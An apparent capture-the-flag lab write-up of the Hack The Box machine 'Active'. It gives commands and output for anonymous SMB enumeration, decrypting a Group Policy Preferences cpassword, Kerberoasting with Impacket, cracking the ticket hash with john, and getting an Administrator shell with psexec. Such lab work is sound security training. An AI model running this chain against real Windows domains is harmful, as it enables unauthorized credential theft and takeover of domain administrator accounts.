# 1. Executive Summary

The tester successfully penerated the target system. The tester retrived a credential from the running server on the target, and gained higher privilege credential by abusing Single-Sign-On misconfiguration. 


## 1.1 General information
IP: 10.10.10.100
Tester: LifeTimeScriptKiddie
Target: Active.htb 10.10.10.100
Used tools: nmap, smbclient, Impacket-, smbmap, gpp-decrypt

## 1.2 Vulnerability - MITRE Attack Tree
T1555 - 
Credential Access -> Credentials from Password Stores
T1558 -
Steal or Forge Kerberos Tickets

Mitigation
M1015 - Active Directory Configuration

## 1.3 Technical Summary
SMB account credential was exposed. The tester logged into SMB server using null credential, retrieved GPP encrypted credential, and used the decrypted credential to do Kerberoasting. 


## 1.4 Recommendation: 
1. Remove the exposed credentias from the SMB server. 
2. Remove Null access on SMB server unless it is absolutely required. 
3. Give minimum required access to normal user account. 


# 2. Technical Detail 

## 2.1 Port Scanning using nmap
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-04 06:24 EDT
Nmap scan report for 10.10.10.100
Host is up (0.033s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE           VERSION
88/tcp    open  kerberos-sec?
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  globalcatLDAP?
3269/tcp  open  globalcatLDAPssl?
49152/tcp open  msrpc             Microsoft Windows RPC
49153/tcp open  msrpc             Microsoft Windows RPC
49154/tcp open  msrpc             Microsoft Windows RPC
49155/tcp open  msrpc             Microsoft Windows RPC
49157/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc             Microsoft Windows RPC
49163/tcp open  msrpc             Microsoft Windows RPC
49176/tcp open  msrpc             Microsoft Windows RPC
...snip...

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-11-04T10:27:08
|_  start_date: 2022-11-04T10:22:51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.70 seconds

```

## 2.2 SMB enumerationg using smbmap and smbclient.

```
└─$ smbmap -H 10.10.10.100 
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS

```

The tester downloaded the entire Replication disk. Then manually searched for interesting file. Groups.xml file indicates username and cpassword. 
After a little bit of research, the tester was able to decrpt the cpassword hash. 

```bash
└─$  impacket-smbclient active.htb/@10.10.10.100                                                             
recurse OFF
mget *


└─$ cat Groups.xml         
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>


┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ cat password  
edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```



## 2.3 Kerberos attack. 

Kerberos is one of SSO technology that authenticates service requests between two or more trusted hosts across an untrusted network. 

### 2.3.1 Kerberoasting  AS-REP
A quick summarize. The tester used retrived credential to request SPN to KDC. The KDC verified the credential and returned TGT (AS-REP). And the TGT contains user's identification which is encrytyped with KDC secret key. 
The tester decrypted the krb5tgs using john and rockyou.txt. 


```
┌──(kali㉿kali)-[~]
└─$ impacket-GetUserSPNs  active.htb/svc_tgs          
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-11-16 20:52:29.474565       
```

```

└─$ impacket-GetADUsers active.htb/svc_tgs:GPPstillStandingStrong2k18


└─$ impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -outputfile outputTGS.txt

└─$ cat outputTGS.txt 
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$e4601375d36b55e14352299b9e4d1195$22242432fef9831a51e
cc59ad94e400edae38e381496423456b8439ebf6e10790dcee018c55d6fb6d1287a8df90e4ff1d6ab98de25d7716b797a2fc5347f5a8b6a5666e
35c3b9194b0be5808089f69e46b61bd76a7c0ea597b0accc547fa19809492b281e8db5afc7543dbd72d6751f0cb5006963848e883328f163590e
dfb4f9174fae0f8db2f7c71e07420c18a1819bc7ccf485116bf4c365f959632da79b792d3e6c2687dbff13dc4fc12f67ac6ecd280e5fc4e628b8
e9dc6dbc1783bce5725cf8096c0d58652dc62ec60e4687ae1f1ea1c89282d8209531bdad90b973fa56bd7140eae9154b82a8fad5017dc1a61475
579a5f8fcb83b5a77eb243a0ce60dcc1ef35ec72d483e9c276e538015aeec445a85a5f3746404babf62fc6bfc982d40270229bf82c7d0f23e95f
49f1b1311ce2d677bdc7e58f3c042eb9ab3714c56692ece5984c22186d5d90a6846d67946b3312002eae1961511ab7ed60c6b7fe7278e8d116cc
0097c7bb1924cd27400cad38942c23d52a331793be755a50c90517abf0f4ab20470f858a804520313a6ac0959073a2eda95eda80145e09daf819
3587bc6d3a1e1c35a1f0f66fff03544997d33e080b9d91fa660e420ef1997896d14c17fbd44e81aa6434a200eab80af2e53bc2b5faa8104bf26e
065a3260c20f463e80b38603d3a8dfafdb3e8ac82dca24e67744dfa08dbb26f9f58e609430f4bbda22919338a546a1b2d4a258acbc3508b48844
3aafc4f048a176a65204a50935544b81163a9f22118a8f6b8b5de35f9df0c01327bcf542a25ca809d3955aaa57aa82945502b4819f474fb31630
aeda83c75a1dde2daa80e3dc4065ba4097bda620441f866ab64879249e8d6044cb89ec48bfc151f4b62c98a46c4f086487e3597c50d9e0ee4fce
ae27fbba34427ab3abef933ee5987167434cac7101da8a4fff1b628522e7ff781fbd6c44cc6e24a70ac1e56240db80e67c1857058d96c881601e
c9dffa4d61ce9d61b78000039f61c4f229e314e5c4d20aa47730ed502314e80d25e4cbb67fa6a2e088d18be3cd02dd0e41bb99afcf8c95f5590b
d60039b7e8a5f6df4eb791cb5345b454b2380cf211825876595b511283886733beaaea7060fc398a19329686d8e7a91fe347da23dddebeef75fe
421417081b57110cb9ed59d53a74551882ed762cd7c43502b8a2960e22685d2da87662bfa8a17a3a3646a48212fcdf8817b6e5240a2ef9111605
0b51b0b21c828b2cce67a


┌──(kali㉿kali)-[~/HTB/ACTIVE]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt outputTGS.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:04 DONE (2022-11-16 22:32) 0.2127g/s 2242Kp/s 2242Kc/s 2242KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


```


## 2.4 System shell using impacket-psexec
```
└─$ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 


c:\Users\Administrator\Desktop> type root.txt
ea0179d65184342d3d66318b0312e378
```


# 3. Resources
https://www.hackthebox.com/achievement/machine/288193/148

https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient

https://github.com/jtpereyda/regpol

https://infinitelogins.com/2020/09/07/cracking-group-policy-preferences-file-gpp-xml/

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
https://www.hackingarticles.in/abusing-kerberos-using-impacket/
https://www.hackingarticles.in/kerberoasting-and-pass-the-ticket-attack-using-linux/
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux